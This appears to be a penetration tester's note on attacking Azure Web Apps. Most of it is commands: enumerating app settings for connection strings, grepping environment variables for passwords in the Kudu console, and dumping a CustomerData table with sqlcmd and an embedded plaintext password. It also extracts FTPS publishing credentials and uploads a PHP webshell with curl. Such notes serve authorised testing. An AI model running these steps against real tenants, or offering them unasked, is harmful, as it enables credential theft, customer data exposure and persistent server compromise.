___
You probably need info from [[resource_enumeration]] first
### Enumeration
---

Get info about a webapp resource
```powershell
(Get-AzWebApp -ResourceGroupName 'group' -Name 'companyports-site').SiteConfig
```

```powershell
Get-AzWebApp -Name megabigtechdevapp23
```

**Static webapps**:

Get info
```powershell
az staticwebapp show --name 'name' --resource-group 'dat group'
```

Get settings (properties will sometimes contain sensitive info like conn strings)
```bash
az staticwebapp appsettings list --name 'name' --resource-group 'dat group'
```


### Kudu / SCM 
---
This is a separate dev container from prod, have management stuff.

```bash
prod --> companyapp.azurewebsites.net
kudu/scm --> companyapp.scm.azurewebsites.net
```
You need the *Website Contributor* roles to utilize

**Exploitation**

If you can login, do to debug --> powershell
Then: [[managed_identity_and_apps]]

OR

find connection strings etc..
```powershel
env | findstr 'password'
```

Find DB? do this from powershell session on kudu
```powershell
sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P 'V%#J3c5jceryjcE' -d customerdevneddb -Q "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'"
```

Read table
```powershell
sqlcmd -S megabigdevsqlserver.database.windows.net -U dbuser -P 'V%#J3c5jceryjcE' -d customerdevneddb -Q "SELECT * FROM CustomerData"
```


Retrieve the FTPS deployment URL, username and password:

```powershell
$webAppName = "<company-domain-portal>"
$resourceGroupName = "<groupname>"

$publishingProfileXml = [xml](Get-AzWebAppPublishingProfile -Name $webAppName -ResourceGroupName $resourceGroupName -OutputFile null)

$username = $publishingProfileXml.SelectSingleNode("//publishData/publishProfile[@publishMethod='MSDeploy']").userName
$password = $publishingProfileXml.SelectSingleNode("//publishData/publishProfile[@publishMethod='MSDeploy']").userPWD
$ftpsProfile = $publishingProfileXml.SelectSingleNode("//publishData/publishProfile[@publishMethod='FTP']")
$ftpsUrl = $ftpsProfile.publishUrl

$username
$password
$ftpsUrl
```

you can then upload a webshell or whatever you want via curl.
```bash
curl -T shell.php --ssl ftps://<company-domain-portal>.ftp.azurewebsites.windows.net/site/wwwroot/portal/shell.php --user '<PublishingUsername>'
```


> [!NOTE] Flames
> Azure webapps have Defender OFF by default
